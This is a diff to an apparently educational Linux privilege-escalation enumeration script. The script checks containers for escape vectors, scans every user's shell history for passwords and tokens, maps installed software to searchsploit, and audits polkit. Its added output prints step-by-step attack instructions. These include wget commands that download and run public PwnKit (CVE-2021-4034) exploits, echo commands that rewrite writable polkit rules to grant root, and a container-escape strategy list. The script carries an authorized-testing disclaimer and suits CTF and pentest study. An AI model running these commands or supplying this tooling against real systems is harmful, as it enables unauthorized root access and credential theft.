+    info "Checking seccomp profile..."
+    if [ -f /proc/self/status ]; then
+        local seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}')
+        case "$seccomp" in
+            0)
+                warn "Seccomp: DISABLED - No syscall filtering (dangerous for host)"
+                teach "No seccomp means you can make any syscall"
+                ;;
+            1)
+                ok "Seccomp: STRICT - Very restrictive"
+                ;;
+            2)
+                info "Seccomp: FILTER - Default Docker profile active"
+                ok "Standard syscall filtering in place"
+                ;;
+            *)
+                info "Seccomp: UNKNOWN ($seccomp)"
+                ;;
+        esac
+    fi
+    
+    # === CHECK 5: AppArmor/SELinux ===
+    info "Checking container MAC (Mandatory Access Control)..."
+    if [ -f /proc/self/attr/current ]; then
+        local mac_profile=$(cat /proc/self/attr/current 2>/dev/null)
+        if [ -n "$mac_profile" ] && [ "$mac_profile" != "unconfined" ]; then
+            info "MAC profile: $mac_profile"
+            ok "Container has MAC restrictions"
+        else
+            warn "MAC: unconfined - No AppArmor/SELinux restrictions"
+            teach "Unconfined = easier to exploit misconfigurations"
+        fi
+    fi
+    
+    # === CHECK 6: PID Namespace ===
+    info "Checking PID namespace isolation..."
+    local host_pid_count=$(ps aux 2>/dev/null | wc -l)
+    
+    if [ $host_pid_count -gt 50 ]; then
+        critical "PID namespace likely SHARED - Can see host processes"
+        vuln "Can see $host_pid_count processes - likely host PID namespace"
+        teach "Shared PID namespace means:"
+        teach "  • You can see all host processes"
+        teach "  • With CAP_SYS_PTRACE you can attach to them"
+        teach "  • Look for sensitive processes: ps aux | grep -E 'ssh|su|sudo'"
+    else
+        ok "PID namespace appears isolated (only $host_pid_count processes visible)"
+    fi
+    
+    # === CHECK 7: Cgroup Analysis ===
+    info "Analyzing cgroup configuration..."
+    if [ -f /proc/1/cgroup ]; then
+        cat /proc/1/cgroup | while read line; do
+            log "  $line"
+        done
+        
+        # Check if cgroup is writable (release_agent exploit)
+        if [ -w /sys/fs/cgroup ]; then
+            critical "cgroup filesystem is WRITABLE - release_agent exploit possible"
+            vuln "/sys/fs/cgroup is writable!"
+            teach "Cgroup release_agent escape:"
+            teach "  1. Write malicious script to host-accessible path"
+            teach "  2. Configure release_agent to execute it"
+            teach "  3. Trigger cgroup cleanup"
+            teach "  PoC: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
+        fi
+    fi
+    
+    # === CHECK 8: Mounted Filesystems ===
+    info "Checking for suspicious mounts..."
+    mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup)" | while read line; do
+        log "  $line"
+        
+        # Check for host filesystem mounts
+        if echo "$line" | grep -qE "on / type|on /host|on /mnt"; then
+            warn "Potential host filesystem mount detected"
+        fi
+        
+        # Check for writable host paths
+        local mount_point=$(echo "$line" | awk '{print $3}')
+        if [ -w "$mount_point" ] && [ "$mount_point" != "/tmp" ] && [ "$mount_point" != "/dev/shm" ]; then
+            vuln "Writable mount from host: $mount_point"
+            teach "Check if this is a host directory - you may be able to modify host files"
+        fi
+    done
+    
+    # === CHECK 9: Kernel Version ===
+    info "Kernel version (shared with host): $(uname -r)"
+    teach "Since containers share the host kernel, kernel exploits affect the host"
+    teach "Check enum_kernel() section for kernel-specific exploits"
+    
+    # === CHECK 10: Network Mode ===
+    info "Checking network mode..."
+    if ip addr | grep -q "docker0\|eth0"; then
+        info "Container has network access"
+        
+        # Check if can reach host
+        local host_gateway=$(ip route | grep default | awk '{print $3}')
+        if [ -n "$host_gateway" ]; then
+            info "Host gateway: $host_gateway"
+            teach "Scan host from container: nmap $host_gateway"
+            teach "Host may have services only accessible from inside"
+        fi
+    fi
+    
+    if ip addr | grep -q "host"; then
+        warn "Container might be using host networking (--net=host)"
+        teach "Host networking = no network isolation"
+    fi
+    
+    # === Summary ===
+    log ""
+    info "Container escape strategy summary:"
+    teach "1. If privileged: Mount host disk and chroot"
+    teach "2. If docker.sock: Create escape container"
+    teach "3. If CAP_SYS_ADMIN: Mount host filesystem"
+    teach "4. If shared PID + CAP_SYS_PTRACE: Inject into host process"
+    teach "5. If writable cgroups: release_agent exploit"
+    teach "6. Check for kernel exploits (affects host)"
+    teach "7. If mounted host paths: Modify sensitive files (.ssh/authorized_keys)"
 }
 
 # === SYSTEMD ANALYSIS ===
@@ -2184,6 +3981,92 @@ enum_passwords() {
             teach "Try this key for SSH access: ssh -i $key user@target"
         fi
     done
+    info "Checking command history for ALL users..."
+    while IFS=: read -r username x uid x x homedir shell; do
+        if [ $uid -ge 1000 ] && [ -d "$homedir" ]; then
+            for histfile in .bash_history .zsh_history .python_history .mysql_history; do
+                if [ -r "$homedir/$histfile" ]; then
+                    if grep -iE "password|passwd|pwd|secret|token|key|curl.*-u|wget.*password" "$homedir/$histfile" 2>/dev/null | head -5 | grep -q "."; then
+                        critical "User $username history contains passwords: $homedir/$histfile"
+                        vuln "Command history with credentials for user: $username"
+                        grep -iE "password|passwd|pwd|secret|token" "$homedir/$histfile" 2>/dev/null | head -3 | while read line; do
+                            log "  $line"
+                        done
+                    fi
+                fi
+            done
+        fi
+    done < /etc/passwd
+}
+# ============================================
+# Software Version Checking
+# ============================================
+
+enum_software_versions() {
+    section "INSTALLED SOFTWARE VERSION ANALYSIS"
+    
+    explain_concept "Vulnerable Software Detection" \
+        "Outdated software often contains known exploitable vulnerabilities. Identifying installed versions helps locate attack vectors." \
+        "Package managers track installed software. CVE databases document version-specific vulnerabilities. Attackers search for services running old versions with public exploits. Common targets: Apache, nginx, PHP, Python libraries, database servers." \
+        "Process:\n  1. List installed packages\n  2. Identify versions\n  3. Cross-reference with exploit-db or searchsploit\n  4. Focus on network-facing services first"
+    
+    info "Enumerating installed packages ( a moment)..."
+    
+    # Detect package manager
+    if command -v dpkg >/dev/null 2>&1; then
+        info "Using dpkg (Debian/Ubuntu system)"
+        
+        # Check for commonly exploitable packages
+        local targets=("apache2" "nginx" "php" "mysql-server" "postgresql" "openssh-server" "sudo" "polkit" "vim" "python3" "ruby" "nodejs")
+        
+        for pkg in "${targets[@]}"; do
+            local version=$(dpkg -l "$pkg" 2>/dev/null | grep "^ii" | awk '{print $3}')
+            if [ -n "$version" ]; then
+                info "  $pkg: $version"
+                teach "  Search exploits: searchsploit $pkg $version"
+            fi
+        done
+        
+    elif command -v rpm >/dev/null 2>&1; then
+        info "Using rpm (RHEL/CentOS system)"
+        
+        local targets=("httpd" "nginx" "php" "mysql-server" "postgresql-server" "openssh-server" "sudo" "polkit" "vim" "python3")
+        
+        for pkg in "${targets[@]}"; do
+            local version=$(rpm -q "$pkg" 2>/dev/null | grep -v "not installed")
+            if [ -n "$version" ]; then
+                info "  $version"
+                teach "  Search exploits: searchsploit $pkg"
+            fi
+        done
+    fi
+    
+    # Check web server versions directly
+    if command -v apache2 >/dev/null 2>&1; then
+        local apache_ver=$(apache2 -v 2>/dev/null | head -1)
+        warn "Apache detected: $apache_ver"
+        teach "Check for known Apache vulnerabilities for this version"
+    fi
+    
+    if command -v nginx >/dev/null 2>&1; then
+        local nginx_ver=$(nginx -v 2>&1)
+        warn "Nginx detected: $nginx_ver"
+        teach "Check for known Nginx vulnerabilities for this version"
+    fi
+    
+    # Check interpreters
+    if command -v php >/dev/null 2>&1; then
+        local php_ver=$(php -v 2>/dev/null | head -1)
+        warn "PHP detected: $php_ver"
+        teach "Check for PHP CVEs: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html"
+    fi
+    
+    # Check Python packages
+    if command -v pip3 >/dev/null 2>&1; then
+        info "Checking Python packages for known vulnerabilities..."
+        teach "Run 'pip3 list --outdated' to see outdated packages"
+        teach "Use 'safety check' to scan for known vulnerabilities"
+    fi
 }
 
 # === INTERESTING FILES ===
@@ -2216,6 +4099,59 @@ enum_interesting_files() {
         [ -r "$file" ] && log "  $file"
     done
 }
+# ============================================
+# Enhanced Hidden File Search
+# ============================================
+
+enum_hidden_files() {
+    section "HIDDEN FILES & DIRECTORIES"
+    
+    explain_concept "Hidden Files" \
+        "Files/directories starting with '.' are hidden from normal 'ls' commands. Attackers use these to hide tools, backdoors, and persistence mechanisms." \
+        "Unix convention: files starting with '.' don't appear in directory listings unless using 'ls -a'. This is a feature, not security, but attackers exploit it to hide malicious files in plain sight." \
+        "Focus on:\n  • /tmp, /var/tmp, /dev/shm (temporary storage)\n  • User home directories\n  • Unusual locations like /, /opt, /usr"
+    
+    info "Searching for hidden files in sensitive locations..."
+    
+    # Check common hiding spots
+    for dir in /tmp /var/tmp /dev/shm /opt /; do
+        if [ -d "$dir" ]; then
+            find "$dir" -maxdepth 2 -name ".*" -type f 2>/dev/null | while read hidden; do
+                case "$(basename "$hidden")" in
+                    .bash_history|.bashrc|.profile|.vimrc|.ssh|.cache|.local|.config|.gnupg)
+                        # Normal hidden files, skip
+                        ;;
+                    *)
+                        warn "Hidden file: $hidden"
+                        
+                        # Check if executable
+                        if [ -x "$hidden" ]; then
+                            vuln "Hidden EXECUTABLE: $hidden"
+                        fi
+                        
+                        # Check if SUID
+                        if [ -u "$hidden" ]; then
+                            critical "Hidden SUID binary: $hidden"
+                        fi
+                        ;;
+                esac
+            done
+            
+            # Check for hidden directories
+            find "$dir" -maxdepth 2 -name ".*" -type d 2>/dev/null | while read hidden_dir; do
+                case "$(basename "$hidden_dir")" in
+                    .ssh|.gnupg|.cache|.local|.config)
+                        # Normal, skip
+                        ;;
+                    *)
+                        warn "Hidden directory: $hidden_dir"
+                        ;;
+                esac
+            done
+        fi
+    done
+}
+
 # ═══════════════════════════════════════════════════════════════
 # ADDITIONAL ENUMERATION MODULES
 # ═══════════════════════════════════════════════════════════════
@@ -2709,55 +4645,192 @@ enum_polkit() {
     
     explain_concept "Polkit (PolicyKit)" \
         "Polkit allows unprivileged processes to communicate with privileged ones. pkexec is like sudo but uses polkit for authorization." \
-        "CVE-2021-4034 (PwnKit) was a critical vulnerability in pkexec. Even if patched, misconfigurations in polkit rules can grant unintended privileges." \
-        "Check:\n  â€¢ pkexec version (CVE-2021-4034 if < 0.120)\n  â€¢ Writable polkit rules in /etc/polkit-1/\n  â€¢ Custom actions in /usr/share/polkit-1/actions/"
+        "Desktop Linux needs fine-grained access control. Example: You click 'Install Updates' - the GUI runs as your user but needs root to install packages. Polkit acts as the middleman, checking if you're authorized. pkexec is the command-line equivalent of sudo, but instead of /etc/sudoers, it uses polkit policies." \
+        "How it works:\n  1. Unprivileged process wants to do privileged action\n  2. Asks polkit: 'Am I allowed?'\n  3. Polkit checks policies in /usr/share/polkit-1/actions/\n  4. May prompt for password\n  5. If authorized, polkit grants access\n\nWhy vulnerabilities matter:\n  • pkexec is SUID root (runs as root)\n  • Processes user input (authentication, environment)\n  • Complex codebase handling security decisions\n  • Used by default on most Linux desktops"
     
-    if command -v pkexec >/dev/null 2>&1; then
-        local pkexec_path=$(which pkexec)
-        info "pkexec found: $pkexec_path"
-        
-        # Check version for PwnKit
-        local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
-        if [ -n "$version" ]; then
-            info "pkexec version: $version"
-            
-            # Simple version comparison for 0.120
-            local major=$(echo "$version" | cut -d. -f1)
-            local minor=$(echo "$version" | cut -d. -f2)
-            
-            if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
-                critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
-                vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
-                teach "PwnKit exploitation:"
-                teach "  wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
-                teach "  chmod +x PwnKit"
-                teach "  ./PwnKit"
-            else
-                ok "pkexec version appears patched for PwnKit"
-            fi
-        fi
-        
-        # Check polkit rules
-        if [ -d /etc/polkit-1/rules.d ]; then
-            find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
-                if [ -w "$rule" ]; then
-                    critical "Writable polkit rule: $rule"
-                    vuln "Writable polkit rule: $rule"
-                    teach "Modify rule to grant yourself admin rights"
-                elif [ -r "$rule" ]; then
-                    # Check for permissive rules
-                    if grep -qE "return polkit.Result.YES" "$rule" 2>/dev/null; then
-                        warn "Permissive polkit rule found: $rule"
-                        info "Review this rule for privilege escalation opportunities"
-                    fi
-                fi
-            done
-        fi
-    else
+    if ! command -v pkexec >/dev/null 2>&1; then
         ok "pkexec not installed"
+        return
+    fi
+    
+    local pkexec_path=$(which pkexec)
+    local has_vulnerability=0
+    local has_writable_rules=0
+    
+    info "pkexec found: $pkexec_path"
+    
+    # Check version for PwnKit
+    local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
+    if [ -n "$version" ]; then
+        info "pkexec version: $version"
+        
+        # Simple version comparison for 0.120
+        local major=$(echo "$version" | cut -d. -f1)
+        local minor=$(echo "$version" | cut -d. -f2)
+        
+        if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
+            has_vulnerability=1
+            critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
+            vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CVE-2021-4034 - PwnKit (Memory Corruption)"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  A memory corruption vulnerability in pkexec that allows ANY"
+            teach "  user to get root WITHOUT needing a password or any special"
+            teach "  permissions. One of the most critical vulnerabilities of 2022."
+            teach ""
+            teach "BACKGROUND - What is pkexec:"
+            teach "  pkexec is like sudo but uses polkit for authorization."
+            teach "  Example: pkexec /bin/bash (asks for password, gives root shell)"
+            teach "  It's SUID root, meaning it runs with root privileges."
+            teach ""
+            teach "WHY IT EXISTS - The Technical Flaw:"
+            teach "  When you run a program in Linux, it receives arguments in an array."
+            teach "  Example: ./program arg1 arg2 arg3"
+            teach "  The array looks like: ['program', 'arg1', 'arg2', 'arg3', NULL]"
+            teach ""
+            teach "  pkexec makes a critical mistake when handling this array:"
+            teach "  1. It counts the number of arguments"
+            teach "  2. It removes the first argument (the program name)"
+            teach "  3. It shifts everything down"
+            teach ""
+            teach "  THE BUG:"
+            teach "  If you call pkexec with ZERO arguments (no command to execute),"
+            teach "  pkexec tries to remove argument[0] but there's nothing there!"
+            teach ""
+            teach "  What happens:"
+            teach "  1. pkexec receives: argv[0] = NULL (empty)"
+            teach "  2. Tries to remove argv[0]"
+            teach "  3. Shifts down, but shifts ENVIRONMENT variables instead"
+            teach "  4. Now environment variables are in the argument array"
+            teach "  5. pkexec processes them as if they were arguments"
+            teach "  6. Attacker can inject malicious environment variables"
+            teach "  7. These get executed with root privileges"
+            teach ""
+            teach "SIMPLIFIED ANALOGY:"
+            teach "  Imagine a security guard checking a list of people:"
+            teach "  1. Guard expects: [Name, ID, Purpose]"
+            teach "  2. You give empty list: []"
+            teach "  3. Guard removes first item (nothing there)"
+            teach "  4. Guard accidentally reads from the NEXT paper (environment vars)"
+            teach "  5. Treats that paper as if it was the approved list"
+            teach "  6. You've tricked the guard into reading your fake approval"
+            teach ""
+            teach "WHY IT EXISTED FOR 12+ YEARS:"
+            teach "  The vulnerability was introduced in pkexec's first version (2009)."
+            teach "  It's a subtle bug - only triggers when argc = 0, which normally"
+            teach "  never happens (programs always have at least one argument)."
+            teach "  Took until 2021 for someone to think: 'What if argc = 0?'"
+            teach ""
+            teach "HOW TO EXPLOIT:"
+            teach ""
+            teach "  Method 1 - Use public exploit:"
+            teach "  1. Download PwnKit exploit:"
+            teach "     wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
+            teach "  2. Make it executable:"
+            teach "     chmod +x PwnKit"
+            teach "  3. Run it:"
+            teach "     ./PwnKit"
+            teach "  4. Get root shell immediately"
+            teach ""
+            teach "  Method 2 - Compile from source:"
+            teach "  1. Download C exploit code:"
+            teach "     wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c"
+            teach "  2. Compile:"
+            teach "     gcc cve-2021-4034.c -o exploit"
+            teach "  3. Run:"
+            teach "     ./exploit"
+            teach ""
+            teach "  The exploit works by:"
+            teach "  1. Calling pkexec with argc = 0 (no arguments)"
+            teach "  2. Setting malicious environment variable (GCONV_PATH)"
+            teach "  3. GCONV_PATH points to attacker's shared library"
+            teach "  4. pkexec loads the malicious library as root"
+            teach "  5. Library executes attacker's code = root shell"
+            teach ""
+            teach "IMPACT:"
+            teach "  • Works on almost ALL Linux distributions"
+            teach "  • No password or special permissions needed"
+            teach "  • ANY user (including restricted users) → Root"
+            teach "  • Existed since 2009, affected billions of systems"
+            teach "  • One of the most widespread Linux vulnerabilities ever"
+            log ""
+        else
+            ok "pkexec version appears patched for PwnKit"
+        fi
+    fi
+    
+    # Check polkit rules for misconfigurations
+    if [ -d /etc/polkit-1/rules.d ]; then
+        find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
+            if [ -w "$rule" ]; then
+                has_writable_rules=1
+                critical "Writable polkit rule: $rule"
+                vuln "Writable polkit rule: $rule"
+                log ""
+                teach "╔════════════════════════════════════════════════════════════╗"
+                teach "║  Writable Polkit Rules - Policy Manipulation"
+                teach "╚════════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT THIS MEANS:"
+                teach "  Polkit rules control who can do what privileged actions."
+                teach "  If you can write to rule files, you can grant yourself access."
+                teach ""
+                teach "HOW POLKIT RULES WORK:"
+                teach "  Rules are JavaScript files that define policies."
+                teach "  Example rule:"
+                teach "  polkit.addRule(function(action, subject) {"
+                teach "    if (subject.user == \"bob\") {"
+                teach "      return polkit.Result.YES;  // Bob can do anything"
+                teach "    }"
+                teach "  });"
+                teach ""
+                teach "EXPLOITATION:"
+                teach "  1. Create a permissive rule:"
+                teach "     echo 'polkit.addRule(function(action, subject) {' > $rule"
+                teach "     echo '  if (subject.user == \"$(whoami)\") {' >> $rule"
+                teach "     echo '    return polkit.Result.YES;' >> $rule"
+                teach "     echo '  }' >> $rule"
+                teach "     echo '});' >> $rule"
+                teach ""
+                teach "  2. Now you can run any pkexec command:"
+                teach "     pkexec /bin/bash"
+                log ""
+            fi
+        done
+    fi
+    
+    # Only show additional educational content if something was found
+    if [ $has_vulnerability -eq 1 ] || [ $has_writable_rules -eq 1 ]; then
+        log ""
+        teach "═══════════════════════════════════════════════════════════════"
+        teach "POLKIT - UNDERSTANDING THE SYSTEM"
+        teach "═══════════════════════════════════════════════════════════════"
+        teach ""
+        teach "POLKIT vs SUDO:"
+        teach "  SUDO: Simple file (/etc/sudoers), binary decision, CLI-focused"
+        teach "  POLKIT: Policy framework, complex rules, GUI-focused"
+        teach ""
+        teach "WHY POLKIT EXISTS:"
+        teach "  Desktop GUIs need smooth privilege delegation without sudo prompts."
+        teach "  Examples: Software updates, USB mounting, network configuration"
+        teach ""
+        teach "COMPONENTS:"
+        teach "  • pkexec: Command-line tool (SUID root)"
+        teach "  • polkitd: Background daemon making decisions"
+        teach "  • Policies: XML in /usr/share/polkit-1/actions/"
+        teach "  • Rules: JavaScript in /etc/polkit-1/rules.d/"
+        teach ""
+        teach "SECURITY IMPLICATIONS:"
+        teach "  • pkexec is SUID root → bugs = privilege escalation"
+        teach "  • Writable rules = unauthorized access"
+        teach "  • Race conditions in polkitd = bypass authorization"
+        log ""
     fi
 }
-
 # === SNAP PACKAGES ===
 enum_snap() {
     section "SNAP PACKAGE ANALYSIS"
@@ -2903,21 +4976,32 @@ EOF
     echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
     cat << "EOF"
     
-              Educational Privilege Escalation Tool - v1.3.5
+              Educational Privilege Escalation Tool - Version 1.5.0
     
     ════════════════════════════════════════════════════════════════
 
 EOF
     
+    log ""
+    log "${R}════════════════════════════════════════════════════════════════${RST}"
+    log "${R}                      LEGAL DISCLAIMER                          ${RST}"
+    log "${R}════════════════════════════════════════════════════════════════${RST}"
+    log "${Y}This tool is for AUTHORIZED TESTING ONLY.${RST}"
+    log "${Y}Intended use: CTF competitions, authorized pentesting, education${RST}"
+    log "${R}Unauthorized access to computer systems is ILLEGAL.${RST}"
+    log "${R}You are responsible for ensuring you have permission to test.${RST}"
+    log "${R}════════════════════════════════════════════════════════════════${RST}"
+    log ""
     log "${G}════════════════════════════════════════════════════════════════${RST}"
     log "${Y}[*] Purpose: Educational enumeration with detailed explanations${RST}"
     log "${Y}[*] Every vulnerability includes WHAT, WHY, and HOW to exploit${RST}"
-    log "${R}[!] For authorized testing only - HTB/THM/OSCP practice${RST}"
+    log "${C}[*] Not affiliated with PEASS-ng/LinPEAS project${RST}"
     log "${G}════════════════════════════════════════════════════════════════${RST}"
     log ""
     log "${C}[+] Log file: $LOG_FILE${RST}"
     log "${C}[+] Started: $(date)${RST}"
     log "${P}[+] Extended mode: ENABLED${RST}"
+    log "${W}[+] Development status: Beta ${RST}"
     log ""
     # Core enumeration
     enum_system
@@ -2967,7 +5051,9 @@ EOF
     
     # Credential hunting
     enum_passwords
+    enum_software_versions
     enum_interesting_files
+    enum_hidden_files
     
     #  HTB-specific enumeration
     enum_smb
@@ -2979,6 +5065,7 @@ EOF
     # Tools
     enum_tools
     enum_scheduled
+    enum_process_monitor
     enum_clipboard
     
     # Extended modules (optional)
@@ -2991,6 +5078,7 @@ EOF
         # Phase 1: High-value additions
         enum_cloud_metadata
         enum_language_creds
+        enum_api_keys
         enum_databases_extended
         enum_cicd
         
